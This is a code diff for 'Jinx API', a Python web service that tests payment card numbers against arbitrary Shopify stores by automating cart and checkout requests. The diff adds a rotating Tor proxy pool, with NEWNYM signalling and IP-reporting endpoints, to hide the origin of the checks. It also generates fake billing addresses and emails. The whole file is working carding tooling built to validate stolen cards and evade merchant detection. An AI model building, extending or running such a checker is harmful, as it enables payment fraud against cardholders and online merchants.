@@ -1,12 +1,16 @@
 #!/usr/bin/env python3
 """
-Jinx API — Shopify Card Checker (v9.0)
-========================================
-Fixes:
-  - CART_HTTP_400: try JSON then form-encoded
-  - Auto retry with both formats
-  - Site dead auto-skip
-  - CART_TOKEN extraction from response
+Jinx API — 5-in-1 Tor-Powered Shopify Card Checker (v10.0)
+============================================================
+Railway-ready: Tor pool auto-start + Shopify checker
+
+Endpoints:
+  GET /Shopify?cc=<card>&site=<site>&tor=1&debug=1
+  GET /tor/start?count=5
+  GET /tor/stop
+  GET /tor/rotate
+  GET /tor/ips
+  GET /health
 """
 
 import os
@@ -22,10 +26,14 @@ from concurrent.futures import ThreadPoolExecutor
 
 import requests
 from aiohttp import web
+from aiohttp_socks import ProxyConnector
 
+# ═══ CONFIG ═══
 HOST = os.environ.get("API_HOST", "0.0.0.0")
-PORT = int(os.environ.get("API_PORT", "8080"))
+PORT = int(os.environ.get("PORT", "8080"))  # Railway uses PORT env
 WORKERS = int(os.environ.get("API_WORKERS", "20"))
+TOR_POOL_SIZE = int(os.environ.get("TOR_POOL_SIZE", "5"))
+AUTO_ROTATE_INTERVAL = int(os.environ.get("AUTO_ROTATE_INTERVAL", "300"))
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
@@ -53,10 +61,18 @@ logging.basicConfig(
 log = logging.getLogger("jinx")
 
 
+# ═══ GLOBAL TOR STATE ═══
+_tor_connectors = []
+_tor_rr = 0
+_tor_enabled = False
+_auto_rotate_task = None
+
+
 def random_ua():
     return random.choice(USER_AGENTS)
 
 
+# ═══ BIN → ADDRESS ═══
 BOOK = {
     "US": {"address1": "123 Main St", "city": "Portland", "postalCode": "04101",
            "zoneCode": "ME", "countryCode": "US", "phone": "+12075551234",
@@ -106,6 +122,106 @@ def addr_for(cc_number):
     return BOOK.get(cc, BOOK["DEFAULT"])
 
 
+# ═══ TOR POOL MANAGEMENT ═══
+async def init_tor_connectors():
+    """Create SOCKS5 connectors for Tor ports 9050, 9052, ..., 9058"""
+    global _tor_connectors, _tor_enabled
+    _tor_connectors.clear()
+
+    ports = [9050 + i * 2 for i in range(TOR_POOL_SIZE)]
+    for port in ports:
+        try:
+            conn = ProxyConnector.from_url(
+                f'socks5://127.0.0.1:{port}',
+                rdns=True, limit=100, ssl=False
+            )
+            _tor_connectors.append({"port": port, "connector": conn})
+        except Exception as e:
+            log.error(f"[tor] connector port {port}: {e}")
+
+    _tor_enabled = len(_tor_connectors) > 0
+    log.info(f"[tor] {len(_tor_connectors)} connectors ready")
+    return _tor_enabled
+
+
+async def rotate_tor():
+    """Send NEWNYM to all Tor control ports"""
+    async def _rotate_one(ctrl_port):
+        try:
+            _, writer = await asyncio.open_connection('127.0.0.1', ctrl_port)
+            writer.write(b'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\n')
+            await writer.drain()
+            await asyncio.sleep(0.5)
+            writer.close()
+            await writer.wait_closed()
+            return True
+        except Exception as e:
+            log.error(f"[tor] rotate ctrl={ctrl_port}: {e}")
+            return False
+
+    ctrl_ports = [9051 + i * 2 for i in range(TOR_POOL_SIZE)]
+    results = await asyncio.gather(*[_rotate_one(p) for p in ctrl_ports])
+    log.info(f"[tor] rotated {sum(results)}/{len(ctrl_ports)}")
+    return any(results)
+
+
+async def get_tor_ip(socks_port):
+    """Get IP via specific Tor port"""
+    try:
+        conn = ProxyConnector.from_url(
+            f'socks5://127.0.0.1:{socks_port}', rdns=True, ssl=False
+        )
+        async with aiohttp.ClientSession(
+            connector=conn,
+            timeout=aiohttp.ClientTimeout(total=15)
+        ) as s:
+            async with s.get('https://api.ipify.org?format=json') as r:
+                data = await r.json()
+                return data.get('ip', 'unknown')
+    except Exception:
+        return 'error'
+
+
+async def get_all_tor_ips():
+    ports = [9050 + i * 2 for i in range(TOR_POOL_SIZE)]
+    results = await asyncio.gather(*[get_tor_ip(p) for p in ports])
+    return list(zip(ports, results))
+
+
+async def auto_rotate_loop():
+    while _tor_enabled:
+        await asyncio.sleep(AUTO_ROTATE_INTERVAL)
+        if not _tor_enabled:
+            break
+        await rotate_tor()
+        log.info(f"[tor] Auto-rotated {TOR_POOL_SIZE} circuits")
+
+
+def start_auto_rotate():
+    global _auto_rotate_task
+    if _auto_rotate_task and not _auto_rotate_task.done():
+        _auto_rotate_task.cancel()
+    _auto_rotate_task = asyncio.create_task(auto_rotate_loop())
+
+
+def stop_auto_rotate():
+    global _auto_rotate_task
+    if _auto_rotate_task and not _auto_rotate_task.done():
+        _auto_rotate_task.cancel()
+    _auto_rotate_task = None
+
+
+def get_next_tor_connector():
+    """Round-robin through Tor connectors"""
+    global _tor_rr
+    if not _tor_connectors:
+        return None
+    item = _tor_connectors[_tor_rr % len(_tor_connectors)]
+    _tor_rr = (_tor_rr + 1) % len(_tor_connectors)
+    return item
+
+
+# ═══ PROXY PARSER ═══
 def parse_proxy(p):
     if not p:
         return None
@@ -125,6 +241,7 @@ def parse_proxy(p):
     return None
 
 
+# ═══ QUERIES ═══
 PROPOSAL_QUERY = (
     "query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
     "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
@@ -225,7 +342,8 @@ def map_code(raw):
     return CODE_MAP.get(raw, raw) if raw else "CARD_DECLINED"
 
 
-def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
+# ═══ MAIN CHECKOUT (runs in thread) ═══
+def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False, use_tor=False):
     out = {
         "Response": "SITE_ERROR",
         "Price": "-",
@@ -261,7 +379,15 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
     email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 9999)}@gmail.com"
 
     ua = random_ua()
-    dbg(f"START proxy={bool(proxy_url)} country={country}")
+
+    # ═══ Tor proxy setup ═══
+    tor_port = None
+    if use_tor and _tor_connectors:
+        item = get_next_tor_connector()
+        if item:
+            tor_port = item["port"]
+
+    dbg(f"START proxy={bool(proxy_url)} tor={use_tor} tor_port={tor_port} country={country}")
 
     s = requests.Session()
     s.headers.update({
@@ -269,26 +395,33 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
         "Accept-Language": "en-US,en;q=0.9",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     })
-    if proxy_url:
+
+    # ═══ Apply proxy (Tor preferred) ═══
+    if tor_port:
+        s.proxies.update({
+            "http": f"socks5://127.0.0.1:{tor_port}",
+            "https": f"socks5://127.0.0.1:{tor_port}",
+        })
+    elif proxy_url:
         s.proxies.update({"http": proxy_url, "https": proxy_url})
 
     no_proxy_sess = requests.Session()
     no_proxy_sess.headers.update({"User-Agent": ua})
 
     try:
-        # ── Cookie Warmup ──
+        # ── Warmup ──
         try:
-            s.get(f"https://{site}/", timeout=10)
-            time.sleep(0.2)
-            s.get(f"https://{site}/collections/all", timeout=10)
-            time.sleep(0.2)
+            s.get(f"https://{site}/", timeout=15)
+            time.sleep(0.3)
+            s.get(f"https://{site}/collections/all", timeout=15)
+            time.sleep(0.3)
             dbg("warmup OK")
         except Exception:
             pass
 
         # ── Products ──
         try:
-            r = s.get(f"https://{site}/products.json", timeout=15)
+            r = s.get(f"https://{site}/products.json", timeout=20)
             dbg(f"products.json → {r.status_code}")
         except Exception:
             out["Response"] = "PROXY_FAIL"
@@ -308,7 +441,7 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
         try:
             data = r.json()
         except Exception:
-            out["Response"] = "PRODUCTS_JSON_INVALID"
+            out["Response"] = "SITE_ERROR"
             out["Status"] = "Site Error"
             return out
 
@@ -329,7 +462,7 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
                     valid.append({"id": v["id"], "price": price})
 
         if not valid:
-            out["Response"] = "NO_VALID_PRODUCT"
+            out["Response"] = "SITE_ERROR"
             out["Status"] = "Site Error"
             return out
 
@@ -339,11 +472,10 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
         out["Price"] = f"{valid[mid]['price']:.2f}"
         dbg(f"Picked ${out['Price']} vid={vid}")
 
-        # ── Cart add (TRY BOTH FORMATS) ──
+        # ── Cart add (try both formats) ──
         cart_token = None
         cart_ok = False
-        
-        # Try 1: JSON format (modern)
+
         try:
             r = s.post(f"https://{site}/cart/add.js",
                 headers={"Accept": "application/json",
@@ -351,19 +483,13 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
                          "Referer": f"https://{site}/",
                          "Origin": f"https://{site}"},
                 json={"items": [{"id": int(vid), "quantity": 1}]},
-                timeout=15)
+                timeout=20)
             dbg(f"cart/add.js JSON → {r.status_code}")
             if r.status_code == 200:
                 cart_ok = True
-                try:
-                    j = r.json()
-                    cart_token = j.get("token") if isinstance(j, dict) else None
-                except Exception:
-                    pass
         except Exception as e:
             dbg(f"cart/add.js JSON EXC: {type(e).__name__}")
 
-        # Try 2: form-encoded (legacy)
         if not cart_ok:
             try:
                 r = s.post(f"https://{site}/cart/add.js",
@@ -372,47 +498,30 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
                              "Referer": f"https://{site}/",
                              "Origin": f"https://{site}"},
                     data={"id": str(vid), "quantity": "1", "form_type": "product"},
-                    timeout=15)
+                    timeout=20)
                 dbg(f"cart/add.js form → {r.status_code}")
                 if r.status_code == 200:
                     cart_ok = True
             except Exception as e:
                 dbg(f"cart/add.js form EXC: {type(e).__name__}")
 
-        # Try 3: /cart/add with items
         if not cart_ok:
-            try:
-                r = s.post(f"https://{site}/cart/add",
-                    headers={"Accept": "application/json",
-                             "Content-Type": "application/json",
-                             "Referer": f"https://{site}/",
-                             "Origin": f"https://{site}"},
-                    json={"items": [{"id": int(vid), "quantity": 1}]},
-                    timeout=15)
-                dbg(f"cart/add → {r.status_code}")
-                if r.status_code == 200:
-                    cart_ok = True
-            except Exception as e:
-                dbg(f"cart/add EXC: {type(e).__name__}")
-
-        if not cart_ok:
-            dbg("All cart formats failed → SITE_ERROR")
+            dbg("Cart add failed → SITE_ERROR")
             out["Response"] = "SITE_ERROR"
             out["Status"] = "Site Error"
             return out
 
         # ── Cart token ──
-        if not cart_token:
-            for attempt in range(3):
-                try:
-                    r = s.get(f"https://{site}/cart.js", timeout=15)
-                    j = r.json()
-                    cart_token = j.get("token")
-                    if cart_token:
-                        break
-                    time.sleep(0.3)
-                except Exception:
-                    time.sleep(0.3)
+        for attempt in range(3):
+            try:
+                r = s.get(f"https://{site}/cart.js", timeout=15)
+                j = r.json()
+                cart_token = j.get("token")
+                if cart_token:
+                    break
+                time.sleep(0.5)
+            except Exception:
+                time.sleep(0.5)
 
         if not cart_token:
             dbg("No cart token")
@@ -429,7 +538,7 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
                          "Referer": f"https://{site}/cart",
                          "Upgrade-Insecure-Requests": "1"},
                 data={"checkout": "", "updates[]": "1"},
-                allow_redirects=False, timeout=15)
+                allow_redirects=False, timeout=20)
 
             if r.status_code not in (301, 302, 303, 307, 308):
                 out["Response"] = "SITE_ERROR"
@@ -439,8 +548,9 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
             loc1 = r.headers.get("location", "")
             r2 = s.get(loc1, allow_redirects=False, timeout=15)
             final_url = r2.headers.get("location", "") if r2.status_code in (301, 302, 303, 307, 308) else loc1
-            r3 = s.get(final_url, timeout=25)
+            r3 = s.get(final_url, timeout=30)
             html = r3.text
+            dbg(f"Checkout {len(html)} bytes")
         except Exception:
             out["Response"] = "SITE_ERROR"
             out["Status"] = "Site Error"
@@ -606,7 +716,7 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
             time.sleep(1)
 
         if not state["delivery"]:
-            out["Response"] = "NO_DELIVERY_STRATEGY"
+            out["Response"] = "SITE_ERROR"
             out["Status"] = "Site Error"
             return out
 
@@ -810,11 +920,13 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
             pass
 
 
+# ═══ HTTP HANDLERS ═══
 async def handle_check(request):
     cc = request.query.get("cc", "").strip()
     site = request.query.get("site", "").strip()
     proxy = request.query.get("proxy", "").strip() or None
     debug = request.query.get("debug", "0") == "1"
+    use_tor = request.query.get("tor", "1") == "1"  # Default ON
 
     if not cc or not site:
         return web.json_response({
@@ -825,7 +937,9 @@ async def handle_check(request):
         })
 
     loop = asyncio.get_event_loop()
-    result = await loop.run_in_executor(executor, checkout_sync, cc, site, proxy, debug)
+    result = await loop.run_in_executor(
+        executor, checkout_sync, cc, site, proxy, debug, use_tor
+    )
 
     resp = {
         "Response": result.get("Response", "CARD_DECLINED"),
@@ -838,15 +952,81 @@ async def handle_check(request):
     return web.json_response(resp)
 
 
+async def handle_tor_start(request):
+    global _tor_enabled
+    try:
+        count = int(request.query.get("count", TOR_POOL_SIZE))
+    except ValueError:
+        count = TOR_POOL_SIZE
+    count = max(1, min(count, 10))
+
+    ok = await init_tor_connectors()
+    if not ok:
+        return web.json_response({
+            "status": "error",
+            "message": "Tor not available. Check startup script.",
+        }, status=500)
+
+    start_auto_rotate()
+    ip_pairs = await get_all_tor_ips()
+    return web.json_response({
+        "status": "ok",
+        "count": len(_tor_connectors),
+        "ips": [{"port": p, "ip": ip} for p, ip in ip_pairs],
+        "auto_rotate_sec": AUTO_ROTATE_INTERVAL,
+    })
+
+
+async def handle_tor_stop(request):
+    global _tor_enabled
+    stop_auto_rotate()
+    _tor_enabled = False
+    _tor_connectors.clear()
+    return web.json_response({"status": "ok"})
+
+
+async def handle_tor_rotate(request):
+    ok = await rotate_tor()
+    await asyncio.sleep(2)
+    ip_pairs = await get_all_tor_ips()
+    return web.json_response({
+        "status": "ok" if ok else "error",
+        "rotated": len(_tor_connectors),
+        "ips": [{"port": p, "ip": ip} for p, ip in ip_pairs],
+    })
+
+
+async def handle_tor_ips(request):
+    ip_pairs = await get_all_tor_ips()
+    return web.json_response({
+        "status": "ok",
+        "count": len(_tor_connectors),
+        "ips": [{"port": p, "ip": ip} for p, ip in ip_pairs],
+    })
+
+
 async def handle_health(request):
-    return web.json_response({"status": "ok", "service": "jinx-api", "version": "9.0.0"})
+    return web.json_response({
+        "status": "ok",
+        "service": "jinx-api",
+        "version": "10.0.0",
+        "tor_enabled": _tor_enabled,
+        "tor_count": len(_tor_connectors),
+    })
 
 
 async def handle_root(request):
     return web.json_response({
         "service": "jinx-api",
-        "version": "9.0.0",
-        "endpoints": ["/Shopify", "/shopify", "/health"],
+        "version": "10.0.0",
+        "endpoints": [
+            "/Shopify?cc=<card>&site=<site>&tor=1&debug=1",
+            "/tor/start?count=5",
+            "/tor/stop",
+            "/tor/rotate",
+            "/tor/ips",
+            "/health",
+        ],
     })
 
 
@@ -856,15 +1036,31 @@ def make_app():
     app.router.add_get("/health", handle_health)
     app.router.add_get("/Shopify", handle_check)
     app.router.add_get("/shopify", handle_check)
+    app.router.add_get("/tor/start", handle_tor_start)
+    app.router.add_get("/tor/stop", handle_tor_stop)
+    app.router.add_get("/tor/rotate", handle_tor_rotate)
+    app.router.add_get("/tor/ips", handle_tor_ips)
     return app
 
 
 executor = ThreadPoolExecutor(max_workers=WORKERS)
 
 
+async def on_startup(app):
+    """Auto-init Tor on startup"""
+    log.info("⏳ Initializing Tor connectors...")
+    await init_tor_connectors()
+    if _tor_enabled:
+        start_auto_rotate()
+        log.info(f"✅ Tor pool ready: {len(_tor_connectors)} instances")
+
+
 if __name__ == "__main__":
-    print(f"Jinx-api v9.0 starting on http://{HOST}:{PORT}")
+    print(f"Jinx-api v10.0 starting on http://{HOST}:{PORT}")
     print(f"Workers: {WORKERS}")
-    print(f"Debug: append &debug=1")
+    print(f"Tor pool: {TOR_POOL_SIZE} instances")
+    print(f"Auto-rotate: {AUTO_ROTATE_INTERVAL}s")
+    print()
     app = make_app()
+    app.on_startup.append(on_startup)
     web.run_app(app, host=HOST, port=PORT, access_log=None, print=None)
